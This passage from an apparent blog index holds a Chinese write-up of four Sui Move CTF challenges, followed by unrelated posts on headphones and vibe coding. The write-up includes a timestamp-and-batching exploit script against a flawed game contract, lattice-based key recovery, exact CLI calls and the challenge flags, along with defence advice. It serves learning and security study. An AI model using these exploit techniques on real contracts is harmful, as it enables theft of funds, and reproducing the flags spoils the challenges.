-1 | grep -o '0x[a-f0-9]\\{64\\}')\n  \n            FLAG_RESULT=$(sui client call --package $PACKAGE_ID --module inventory --function get_flag --args $TREASURY_BOX_ID --gas-budget 20000000 2>&1)\n  \n            FLAG_TX_HASH=$(echo \"$FLAG_RESULT\" | grep \"Transaction Digest:\" | grep -o '[A-Za-z0-9]\\{44\\}')\n            echo \"🏁 Flag交易哈希: $FLAG_TX_HASH\"\n            exit 0\n        fi\n    fi\n  \n    # 重置余额并等待下一次机会\n    sui client call --package $PACKAGE_ID --module adventure --function init_balances --args $USERS_TOKEN_AMOUNT_ID --gas-budget 10000000 > /dev/null 2>&1\n    sleep 1\ndone\n```\n\n## 攻击执行过程\n\n### 1. 环境准备\n\n```bash\n# 部署合约获取Package ID\nPackage ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\nHero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\nUsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\n```\n\n### 2. 英雄升级\n\n- 击败30只普通野猪获得160点经验\n- 升级英雄：strength 10→40, defense 5→20, hp 100→200\n\n### 3. PTB攻击\n\n- 等待时间戳余数为1的有利时机\n- 执行20次批量 `slay_boar_king`调用\n- 成功从100 token增加到200 token\n\n### 4. 获取Flag\n\n- 购买宝箱（利用计费错误）\n- 调用 `get_flag`获取Flag事件\n\n## 攻击结果\n\n**成功获取Flag交易哈希**: `23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs`\n\n## 技术要点总结\n\n1. **漏洞组合利用**: 体力消耗漏洞 + 时间戳依赖 + 计费错误\n2. **PTB时间戳同步**: 确保批量操作使用相同时间戳\n3. **英雄升级机制**: 发现并利用升级系统提升战斗力\n4. **概率攻击优化**: 从1/3成功率提升到100%成功率\n\n## 防御建议\n\n1. **修复体力消耗**: 取消注释 `hero::decrease_stamina(hero, 2)`\n2. **移除时间戳依赖**: 使用安全的随机数生成\n3. **修复计费错误**: 统一检查和扣除金额\n4. **限制批量操作**: 对PTB中的重复调用进行限制\n\n这次攻击展示了智能合约中多个看似无关的小漏洞如何被巧妙组合，形成完整的攻击链。\n\n## 详细技术分析\n\n### 时间戳攻击原理\n\nSui区块链中，同一个PTB内的所有操作共享相同的时间戳。这个特性被用来绕过随机性：\n\n```rust\nlet current_timestamp = clock::timestamp_ms(clock);\nlet d100 = current_timestamp % 3;\n```\n\n通过在shell中检查时间戳并在有利时机立即执行PTB，可以确保所有20次调用都获得奖励。\n\n### PTB构造技巧\n\n关键在于正确构造PTB命令：\n\n```bash\nsui client ptb \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  ... (重复20次)\n  --gas-budget 100000000\n```\n\n每个 `--move-call`代表一次函数调用，所有调用在同一个交易中执行。\n\n### 英雄升级数值分析\n\n升级前后战斗力对比：\n\n\n| 属性     | 升级前 | 升级后 | 提升 |\n| -------- | ------ | ------ | ---- |\n| Level    | 1      | 2      | +1   |\n| Strength | 10     | 40     | +30  |\n| Defense  | 5      | 20     | +15  |\n| HP       | 100    | 200    | +100 |\n\n野猪王属性范围：\n\n- HP: 180-220\n- Strength: 20-25\n- Defense: 10-15\n\n升级后英雄的40点攻击力可以轻松突破野猪王的10-15防御。\n\n## 攻击时间线\n\n1. **00:00** - 分析合约代码，发现多个漏洞\n2. **00:30** - 尝试直接攻击野猪王，发现战斗力不足\n3. **01:00** - 研究英雄升级机制\n4. **01:30** - 击败30只普通野猪，升级英雄\n5. **02:00** - 开发PTB攻击脚本\n6. **02:30** - 成功执行攻击，获取Flag\n\n## 关键代码片段\n\n### 漏洞代码1: 体力消耗被注释\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    assert!(hero::stamina(hero) > 0, EHERO_TIRED);\n    // ...\n    let fight_result = fight_monster<BoarKing>(hero, &boar);\n    //hero::decrease_stamina(hero, 2);  // ← 关键漏洞：被注释掉\n    // ...\n}\n```\n\n### 漏洞代码2: 时间戳依赖\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;  // ← 可预测的\"随机\"数\n\n    if (d100 == 1) {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance + 5;  // 奖励\n        event::emit(Amount{amount: *current_balance});\n    } else {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance - 5;  // 惩罚\n        event::emit(Amount{amount: *current_balance});\n    }\n}\n```\n\n### 漏洞代码3: 计费错误\n\n```rust\npublic entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n    event::emit(Amount{amount: *current_balance});\n    assert!(*current_balance >= 200, ERROR_NO_MONEY);  // ← 检查200\n    *current_balance = *current_balance - 100;         // ← 但只扣100\n    let box = inventory::create_treasury_box(ctx);\n    transfer::public_transfer(box, tx_context::sender(ctx));\n}\n```\n\n## 完整攻击脚本\n\n将攻击脚本保存为 `ptb_batch_attack.sh` 并执行：\n\n```bash\nchmod +x ptb_batch_attack.sh\n./ptb_batch_attack.sh\n```\n\n脚本会自动：\n\n1. 监控时间戳，等待有利时机\n2. 执行PTB批量攻击\n3. 购买宝箱并获取Flag\n4. 输出Flag交易哈希\n\n## 学习要点\n\n1. **代码审计重要性**: 仔细检查每一行代码，包括注释\n2. **漏洞组合威力**: 多个小漏洞组合可能产生严重影响\n3. **区块链特性利用**: 理解PTB等区块链特有机制\n4. **攻击链构造**: 从信息收集到最终利用的完整流程\n\n## 相关资源\n\n- [Sui Move 官方文档](https://docs.sui.io/concepts/sui-move-concepts)\n- [PTB 编程指南](https://docs.sui.io/concepts/transactions/prog-txn-blocks)\n- [智能合约安全最佳实践](https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md)\n\n---\n\n# 2. 强盗游戏\n\n## 题目信息\n\n- **题目名称**: 强盗游戏\n- **题目积分**: 52\n- **分类**: blockchain, hohctf, sui, move\n- **解题人数**: 46\n\n## 题目描述\n\n房屋加权的强盗游戏，你能成功获取目标金额吗？HOH moveCTF 强盗游戏\n\n题目提供了一个独特的 Sui Move 合约：\n\n- **Package ID**: `0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c`\n- **部署交易哈希**: `JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY`\n\n## 解题思路\n\n### 1. 合约分析\n\n首先分析Move合约源码，发现这是一个基于动态规划的\"房屋强盗\"问题变种：\n\n```rust\nmodule game::ez_game {\n    public struct Challenge has key, store {\n        id: UID,\n        initial_part: vector<u64>,\n        weights: vector<u64>,\n        target_amount: u64,\n    }\n\n    public struct Flag has copy, drop {\n        owner: address,\n        flag: bool\n    }\n}\n```\n\n关键函数：\n\n- `init_game`: 初始化游戏，创建Challenge对象，设置随机目标金额(10-20)\n- `get_flag`: 验证用户输入，如果计算结果等于目标金额则触发Flag事件\n- `weighted_rob`: 加权房屋强盗算法核心实现\n\n### 2. 算法理解\n\n`weighted_rob`函数实现了一个动态规划算法：\n\n- 初始房屋：`[1, 1, 3, 1, 1]`\n- 初始权重：`[1, 1, 2, 1, 1]`\n- 用户可以添加额外房屋（权重默认为1）\n- 不能抢劫相邻的房屋\n- 每个房屋的价值 = 房屋值 × 权重\n- 目标：找到最大收益\n\n### 3. 解题脚本\n\n编写Python脚本分析所有可能的目标金额：\n\n```python\ndef weighted_rob(houses, weights):\n    n = len(houses)\n    if n == 0:\n        return 0\n\n    dp = []\n    dp.append(houses[0] * weights[0])\n\n    if n > 1:\n        dp.append(max(\n            houses[0] * weights[0],\n            houses[1] * weights[1]\n        ))\n\n    for i in range(2, n):\n        dp_i_1 = dp[i - 1]\n        dp_i_2_plus_house = dp[i - 2] + houses[i] * weights[i]\n        dp.append(max(dp_i_1, dp_i_2_plus_house))\n\n    return dp[n - 1]\n```\n\n通过分析发现所有目标金额的解决方案：\n\n- 目标金额 10 → 用户输入: [3]\n- 目标金额 11 → 用户输入: [4]\n- 目标金额 12 → 用户输入: [5]\n- ...\n- 目标金额 20 → 用户输入: [13]\n\n## 解题步骤\n\n### 1. 初始化游戏\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function init_game --args 0x8\n```\n\n创建了Challenge对象：`0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92`\n\n### 2. 查看Challenge对象\n\n```bash\nsui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\n获取到关键信息：\n\n- **目标金额**: 15\n- **初始房屋**: [1, 1, 3, 1, 1]\n- **权重**: [1, 1, 2, 1, 1]\n\n### 3. 计算解决方案\n\n根据目标金额15，对应的用户输入是 `[8]`。\n\n验证计算过程：\n\n- 完整房屋列表：`[1, 1, 3, 1, 1, 8]`\n- 完整权重列表：`[1, 1, 2, 1, 1, 1]`\n- DP计算：\n  - dp[0] = 1 × 1 = 1\n  - dp[1] = max(1×1, 1×1) = 1\n  - dp[2] = max(1, 1 + 3×2) = 7\n  - dp[3] = max(7, 1 + 1×1) = 7\n  - dp[4] = max(7, 7 + 1×1) = 8\n  - dp[5] = max(8, 7 + 8×1) = 15 ✓\n\n### 4. 获取Flag\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function get_flag \\\n  --args \"[8]\" 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\n## 解题结果\n\n**成功触发Flag事件！**\n\n**触发Flag的交易哈希**: `3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa`\n\n交易事件中显示：\n\n```json\n{\n  \"flag\": true,\n  \"owner\": \"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe\"\n}\n```\n\n## 关键技术点\n\n1. **Sui Move合约交互**: 理解Sui区块链的对象模型和交易机制\n2. **动态规划算法**: 掌握房屋强盗问题的经典DP解法\n3. **加权变种**: 理解权重对算法结果的影响\n4. **随机性处理**: 分析所有可能的目标金额并预计算解决方案\n\n## 总结\n\n这道题目巧妙地将经典的动态规划问题与区块链技术结合，考查了：\n\n- Move语言和Sui区块链的基础知识\n- 动态规划算法的理解和实现\n- 逆向分析和解题思维\n\n---\n\n# 3. 恢复密钥\n\n## 题目信息\n\n- **题目名称**: 恢复私钥\n- **题目积分**: 63\n- **分类**: blockchain, hohctf, sui, move\n- **解题人数**: 32\n- **题目描述**: 我在链上用随机数隐藏了我的私钥，但是我忘记我私钥的内容了，你能帮我恢复私钥嘛？\n\n## 题目环境\n\n- **Package ID**: `0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9`\n- **部署交易哈希**: `Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR`\n\n## 解题思路\n\n### 1. 题目分析\n\n这是一道结合了密码学和区块链技术的综合性CTF题目。通过分析提供的Move智能合约源码，可以发现：\n\n1. 题目使用线性代数加密方案隐藏flag\n2. 加密公式：`enc = A * flag + k`\n   - `A`: 64x23的固定矩阵\n   - `flag`: 23字节的明文（即我们要恢复的私钥）\n   - `k`: 64维随机向量\n   - `enc`: 64维密文向量\n\n### 2. 关键代码分析\n\n```rust\n// 加密函数\nentry fun entrypt_flag(plain_flag: vector<u8>, r: &Random, ctx: &mut TxContext) {\n    let a = get_a();  // 获取64x23矩阵\n    let mut k: vector<u64> = vector[];\n    // 生成64个随机数作为噪声\n    while(i < 64) {\n        k.push_back(random::generate_u64_in_range(&mut generator, 0, 4294967296));\n        i = i + 1;\n    };\n    // 执行加密: enc = A * flag + k\n    let enc = matadd(&matmul(&a, &ex_plain_flag), &k);\n}\n\n// 验证函数\npublic entry fun decrypt_flag(flag: vector<u8>, ctx: &mut TxContext) {\n    assert!(blake2b256(&flag) == x\"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a\", 0);\n    event::emit(FlagEvent {\n        owner: ctx.sender(),\n        flag: true\n    });\n}\n```\n\n### 3. 密码学原理\n\n这是一个基于格理论的加密方案，类似于Learning With Errors (LWE) 问题。要解密需要解决最近向量问题（CVP - Closest Vector Problem）。\n\n## 解题步骤\n\n### 步骤1: 环境准备\n\n首先安装SageMath数学计算软件：\n\n```bash\nsudo apt update && sudo apt install -y sagemath\n```\n\n### 步骤2: 分析密文\n\n从合约源码中可以看到加密后的密文：\n\n```\n[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]\n```\n\n### 步骤3: 使用CVP算法解密\n\n题目提供了解密脚本 `decrypt.sage`，核心算法是Babai CVP算法：\n\n```python\ndef Babai_CVP(Lattice, target):\n    M = Lattice.LLL()\n    G = M.gram_schmidt()[0]\n    diff = target\n    for i in reversed(range(M.nrows())):\n        diff -=  M[i] * ((diff * G[i]) / (G[i] * G[i])).round()\n    return target - diff\n```\n\n### 步骤4: 运行解密脚本\n\n```bash\ncd solve/tests\nsage decrypt.sage\n```\n\n输出结果：\n\n```\n[-]the flag length is: 23\n(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)\n[+]flag{5Ui_M0Ve_CONtrAC7}\n```\n\n### 步骤5: 验证flag\n\n使用Sui CLI调用链上合约验证flag：\n\n```bash\nsui client call \\\n  --package 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 \\\n  --module crypto \\\n  --function decrypt_flag \\\n  --args \"flag{5Ui_M0Ve_CONtrAC7}\" \\\n  --gas-budget 10000000\n```\n\n## 解题结果\n\n- **Flag**: `flag{5Ui_M0Ve_CONtrAC7}`\n- **交易哈希**: `2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX`\n- **验证状态**: Success，成功触发FlagEvent\n\n## 技术要点\n\n### 1. 格理论基础\n\n- **格 (Lattice)**: 由基向量张成的离散点集\n- **CVP问题**: 给定格和目标向量，找到格中最接近目标的向量\n- **LLL算法**: 格基约化算法，用于找到较短的基向量\n\n### 2. Babai算法\n\nBabai算法是解决CVP问题的近似算法：\n\n1. 对格基进行LLL约化\n2. 使用Gram-Schmidt正交化\n3. 通过舍入操作找到最近向量\n\n### 3. Move智能合约\n\n- 使用Sui区块链的Move语言\n- 集成随机数生成器进行加密\n- 通过事件机制验证解题结果\n\n## 总结\n\n这道题目巧妙地结合了：\n\n- **密码学**: 基于格理论的加密方案\n- **数学**: 线性代数和最近向量问题\n- **区块链**: Sui Move智能合约技术\n\n解题的关键在于理解LWE类型的加密方案，并使用适当的格理论算法（CVP）来恢复明文。\n\n---\n\n# 4. 迷宫游戏\n\n## 题目信息\n\n- **题目名称**: 迷宫游戏\n- **题目描述**: 这是一道ctf题目 这里有一个迷宫游戏，你能顺利走出这个迷宫吗\n- **Package ID**: `0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20`\n- **部署交易哈希**: `AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz`\n- **区块链**: Sui Network\n- **语言**: Move\n\n## 题目分析\n\n### 1. 合约结构分析\n\n通过查看Move合约源码，发现这是一个基于Sui区块链的迷宫游戏：\n\n```rust\nconst ROW: u64 = 10;\nconst COL: u64 = 11;\nconst MAZE: vector<u8> = b\"#S########\\n#**#######\\n##*#######\\n##***#####\\n####*#####\\n##***###E#\\n##*#####*#\\n##*#####*#\\n##*******#\\n##########\";\nconst START_POS: u64 = 1;\n```\n\n### 2. 迷宫布局\n\n迷宫是一个10行11列的网格：\n\n```\n#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########\n```\n\n- `#`: 墙壁\n- `S`: 起点 (位置1)\n- `E`: 终点 (位置63)\n- `*`: 可通行路径\n\n### 3. 游戏机制\n\n合约提供三个主要函数：\n\n1. **create_challenge()**: 创建挑战，生成ChallengeStatus对象\n2. **complete_challenge()**: 完成迷宫，需要提供正确的移动序列\n3. **claim_flag()**: 获取flag，需要挑战完成后调用\n\n移动控制：\n\n- `w` (ASCII 119): 向上移动\n- `s` (ASCII 115): 向下移动\n- `a` (ASCII 97): 向左移动\n- `d` (ASCII 100): 向右移动\n\n## 解题过程\n\n### 步骤1: 迷宫路径分析\n\n使用BFS算法分析迷宫，找到从起点S到终点E的最短路径。\n\n位置编号系统：\n\n- 位置 = 行 × 11 + 列\n- 起点S在位置1 (第0行第1列)\n- 终点E在位置63 (第5行第8列)\n\n### 步骤2: 路径搜索算法\n\n```python\ndef find_path():\n    from collections import deque\n\n    start_pos = 1  # S的位置\n    end_pos = 63   # E的位置\n\n    queue = deque([(start_pos, \"\")])\n    visited = set([start_pos])\n\n    while queue:\n        current_pos, path = queue.popleft()\n\n        if current_pos == end_pos:\n            return path\n\n        # 尝试四个方向的移动\n        moves = [\n            ('w', -11),  # 上\n            ('s', 11),   # 下\n            ('a', -1),   # 左\n            ('d', 1)     # 右\n        ]\n\n        for move_char, delta in moves:\n            new_pos = current_pos + delta\n            # 边界检查和墙壁检查\n            # ...\n```\n\n### 步骤3: 找到解决方案\n\n通过BFS搜索，找到最短路径：**`sdssddssaasssddddddwww`**\n\n路径验证：\n\n1. S(1) → s → 12(*) → d → 13(*) → s → 24(*) → s → 35(*)\n2. 35(*) → d → 36(*) → d → 37(*) → s → 48(*) → s → 59(*)\n3. 59(*) → a → 58(*) → a → 57(*) → s → 68(*) → s → 79(*)\n4. 79(*) → s → 90(*) → d → 91(*) → d → 92(*) → d → 93(*)\n5. 93(*) → d → 94(*) → d → 95(*) → d → 96(*) → w → 85(*)\n6. 85(*) → w → 74(*) → w → 63(E) ✅\n\n## 链上执行\n\n### 步骤1: 创建挑战\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function create_challenge \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- Transaction Digest: `BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z`\n- Challenge Object ID: `0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55`\n\n### 步骤2: 完成迷宫挑战\n\n将路径字符串转换为字节数组：\n\n- `sdssddssaasssddddddwww` → `[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]`\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function complete_challenge \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 '[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]' \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- Transaction Digest: `FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx`\n- 触发Success事件，路径验证成功\n\n### 步骤3: 获取Flag\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function claim_flag \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- **Transaction Digest**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n- 触发FlagEvent事件，success: true\n\n## 关键技术点\n\n### 1. Move合约分析\n\n- 理解Sui Move语法和结构\n- 分析entry函数的参数要求\n- 理解事件机制\n\n### 2. 算法应用\n\n- BFS最短路径搜索\n- 二维网格坐标转换\n- 边界条件处理\n\n### 3. 区块链交互\n\n- Sui CLI工具使用\n- 交易参数格式化\n- 对象ID管理\n\n### 4. 数据转换\n\n- 字符串到字节数组转换\n- ASCII码映射\n- Move类型系统理解\n\n## 总结\n\n这道题目考查了：\n\n1. **Move智能合约分析能力**\n2. **图论算法应用** (BFS路径搜索)\n3. **区块链工具使用** (Sui CLI)\n4. **数据格式转换** (字符串→字节数组)\n\n**最终答案**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n\n**Flag**: `CTF{Letsmovectf}`\n\n## 工具和脚本\n\n解题过程中使用的Python脚本可以帮助：\n\n- 迷宫可视化和路径搜索\n- 字节数组格式转换\n- 自动化区块链交互\n\n---\n\n# 综合技术总结\n\n## 核心技能矩阵\n\n### 1. Move智能合约分析\n\n- **语法理解**: 掌握Sui Move的基本语法和类型系统\n- **漏洞识别**: 能够发现注释代码、计费错误等常见漏洞\n- **对象模型**: 理解Sui的对象所有权和转移机制\n- **事件系统**: 掌握事件的触发和监听机制\n\n### 2. 算法与数据结构\n\n- **动态规划**: 房屋强盗问题的经典DP解法及其变种\n- **图论算法**: BFS在路径搜索中的应用\n- **格理论**: CVP问题和LLL算法的实际应用\n- **时间复杂度**: 算法效率分析和优化\n\n### 3. 密码学知识\n\n- **LWE问题**: Learning With Errors加密方案的原理\n- **格基约化**: LLL算法和Babai算法的实现\n- **最近向量问题**: CVP的数学背景和解决方法\n- **哈希函数**: Blake2b等密码学哈希的应用\n\n### 4. 区块链技术\n\n- **Sui CLI**: 命令行工具的熟练使用\n- **PTB机制**: Programmable Transaction Block的构造和执行\n- **时间戳攻击**: 利用区块链时间戳特性的攻击方法\n- **Gas优化**: 交易费用的估算和优化\n\n## 攻击技术分类\n\n### 1. 智能合约漏洞利用\n\n- **代码审计**: 发现被注释的关键代码\n- **逻辑错误**: 利用计费不一致等业务逻辑漏洞\n- **状态管理**: 利用状态更新的时序问题\n- **权限控制**: 绕过访问控制机制\n\n### 2. 时间相关攻击\n\n- **时间戳依赖**: 利用可预测的时间戳生成随机数\n- **PTB同步**: 确保批量操作使用相同时间戳\n- **时序攻击**: 利用操作执行的时间差\n\n### 3. 数学攻击\n\n- **算法逆向**: 通过分析算法找到逆向求解方法\n- **概率分析**: 计算攻击成功的概率并优化策略\n- **密码学攻击**: 使用高级数学工具破解加密方案\n\n### 4. 自动化攻击\n\n- **脚本编写**: 开发自动化攻击脚本\n- **批量操作**: 通过PTB执行大量重复操作\n- **条件触发**: 等待有利条件自动执行攻击\n\n## 防御策略建议\n\n### 1. 代码安全\n\n- **完整性检查**: 确保所有必要的代码都被执行\n- **逻辑一致性**: 检查和扣费逻辑必须保持一致\n- **边界验证**: 严格验证所有输入参数的边界条件\n- **状态同步**: 确保状态更新的原子性\n\n### 2. 随机数安全\n\n- **真随机源**: 使用密码学安全的随机数生成器\n- **时间戳避免**: 不要依赖可预测的时间戳\n- **熵源多样化**: 结合多个熵源生成随机数\n- **随机性测试**: 定期测试随机数的质量\n\n### 3. 访问控制\n\n- **权限最小化**: 只授予必要的最小权限\n- **多重验证**: 关键操作需要多重验证\n- **时间锁**: 对重要操作添加时间延迟\n- **频率限制**: 限制高频操作的执行\n\n### 4. 监控和审计\n\n- **事件监控**: 实时监控异常事件和模式\n- **交易分析**: 分析可疑的交易模式\n- **代码审计**: 定期进行专业的代码安全审计\n- **渗透测试**: 定期进行安全渗透测试\n\n## 结论\n\n这四道Sui Move CTF题目展示了区块链安全的多个重要方面：\n\n1. **技术深度**: 从基础的路径搜索到高级的格理论密码学\n2. **攻击复杂性**: 从单一漏洞利用到多漏洞组合攻击\n3. **工具多样性**: 从简单的CLI工具到复杂的数学软件\n4. **思维方式**: 从逆向分析到正向构造的完整思维链\n\n通过系统性的分析和攻击，我们不仅获得了所有Flag，更重要的是：\n\n- 深入理解了Move智能合约的安全特性\n- 掌握了多种攻击技术和防御策略\n- 提高了综合的安全分析和解决问题的能力\n- 建立了完整的区块链安全知识体系\n\n这些技能和经验对于区块链安全研究、智能合约审计、以及Web3安全防护都具有重要的实践价值。随着区块链技术的不断发展，这类综合性的安全挑战将变得越来越重要，需要我们持续学习和实践。\n","tags":["CTF","Web3","Tec"],"categories":["Tec","CTF","Web3"]},{"title":"How To Define a Referenced Sound?","url":"/2025/04/28/How To Define a Referenced Sound/","content":"## For The Beginning\n\nNow i am lying on my bed listening to Blowin' In The Wind by Bob Dylan with my Sony WF-XM4 which reminds me of my old memories. This one is a wireless headset with low bandwidth and thick low frequency volume. I used to like high frequency monitoring about four years ago. Yes I quit. I stopped chasing high fidelity and choose convenient instead. I’m not quite sure whether it’s financial austerity or just academics. I wanted to note something Deja Vu on my head.\n\n## 1. MoonDrop\n\nIn the far long past years I listened to different types of IEM, what makes me feel the must touching is MoonDrop Kxxs, I was depressed in my age of 18. I lost my patience and curiosity in the whole world in a highly pressured environment: My High School. So I listen to a theme ACG from When the Cicadas Cry, It gave me a peaceful Zen for a short summer. That's also my age I got addicted to Nicotine.\n\nBy chance, I stumbled upon Kxxs review videos on Bilibili, sparking my dive into the world of headphones. The MoonDrop Kxxs, with its sleek silver design and single dynamic driver, came paired with a crystal-clear, silver-plated copper braided cable that silenced the annoying stethoscope effect as I lay in bed, lost in music. That wire stopped me from hearing stethoscope effect noises when I crying in my bed. A standard Harman Curve based training sound effect makes me immersed in the ocean of tunes.\n\nI started obsessed with ACG and slowly turned to Electronic and Rock genres. I used them to release the pain and suffer inside me. After half a year, I was cured.\n\nAlthough it has done well in Mid-frequency vocal part and low-frequency rhythm. But it seems to be more like a luxury symbol in that period of time. Kxxs is no more than a Entry-level headphone. The diaphragm isn't that professional and \"Referenced\". Now , Kxxs is officially announced discontinued. When i look up to the materials, Kato the plus version and KADENZ the final version has replaced it. The curtain of Kxxs has fell. However, it gave me a brief path on the way finding the \"Reference Sound\", the Harman Curve.\n\n## 2. Harman Curve\n\nImagine one simple frequency response diagram can quantification the beautiful of music, that is the Harman Curve. Harman researchers find that nearly straight frequency response won't give a better deduction to the audience. Just like chocolate bars, without corners and lines makes them rigid and tasteless.\n\nThe Harman Curve is dedicating a publicly acceptable frequency response, gain in the low frequency for better liveliness, and improve the high frequency to enhance larger sound field and fidelity, the sound will be not as dry or boring as the record studio do. But now there came up to an problem: “How to convince me that a non-original sound is referenced?”. I can’t. It depends on individually ear preference. Some would think a formulated studio sound is referenced, but some would think a sound that company them through the darkness and asphyxia times. But all i can say is Harman Curve designed a paradigm, less than it can’t be good goods, equals to it would be boring, beyond it brining a different whole new universe.\n\n## 3. Dunu Est 112\n\nIt was the first time knowing Multi-sound unit design when i browsed headphones forums in my age of 19. I sold my Kxxs with deep cherish and bought Dunu Est 112 on Chinese Ebay. Larger power and resolution requirements didn't stopped me, i also bought a Low-spec headphone amp which cost me around 40 dollars.\n\nDunu Est 112 has four different units : 1 Dynamic Driver, 1 Balanced Armature, 2 Electrostatic Drivers. Without doubt, this headphone brings significant high frequency resolution and shortage in low frequency performance. \n\nI really love the electrostatic unit in these earphones. I especially enjoy using them to listen to electronic music, like Coldplay’s *Hymn For The Weekend* or Mike Perry/SHY Martin’s *The Ocean (Radio Edit)*. The electrostatic unit handles the highs with a sweet and smooth quality, rarely producing any sibilance. Complemented by the dynamic driver, the rhythm and bass impact of the songs are quite impressive, as the electrostatic sound overshadows them......However, when switching to other genres, the bass lacks depth, and the soundstage feels scattered and incoherent.\n"},{"title":"Artificial Intelligence Genesis 1-2","url":"/2025/04/16/AI/","content":"## The Creation of the Binary and Humanity\n\n***If*** you're a programmer and haven't heard of vibe coding, you're already behind. The term originated from a semi-self-deprecating tweet and has now become standard usage, although no one can precisely define it. Those familiar with AI-assisted programming generally know what it means: accepting AI suggestions without scrutinizing differences; copying and pasting error messages until the problem is solved; bypassing or randomly changing code that's beyond comprehension until the bug disappears.\n\n***Vibe***  coding feels like a divine assistance on one hand, but on the other, it leads to constant refactoring, going in circles, solving old problems, and creating new ones. Faced with a plethora of tools, it's hard to know which to seriously consider, and new best practices only generate more hidden bugs at a faster pace.\n\n***The*** technical difficulties may lie in the large language model's insufficient context window and the lack of robust long-term memory mechanisms. But in reality, vibe coding shatters the programmer's self-perception, trapping them in a maze built on shifting sands, exhausted and forgetting what efficiency means.\n\n***Vibe*** coding is somewhat like AI art from a year or two ago, looks good at first glance, but the details are wrong when zoomed in. Programming is supposed to be black and white, but reality begins to distort. The correctness of vibe coding cannot be precisely observed. Faced with the massive amount of code generated by AI, programmers quickly give up scrutiny and control. Attempting to guide AI with standards is like a rein on a wild horse, uncertain whether the rules are complete or whether they will be followed.\n\n***Gradually\\,*** programmers stop caring whether the code is correct, as it can always be changed later. In the future, most code will be written by AI, with six-fingered hands appearing and disappearing endlessly. Accepting that temporary work is everything, and change is the only constant. When international news and satirical news become indistinguishable, when all those claiming to pursue truth ultimately seek escape, everything you create will not escape the same fate.\n\n***Individuals*** hiding in a bubble assume everything is fine, but this is often the origin of tragedy. They see only a low-dimensional projection of a complex world, a crude narrative, a mirage. Truth falls into the dark and deep dimensional cracks. What collapses is not the world, but one's own naive imagination. The external is not a projection of reality, but its essence. At first, you think the world is a perfect canvas, then you find more and more cracks, until you realize that the cracks are where you truly live. **It's not just vibe coding, it's vibe 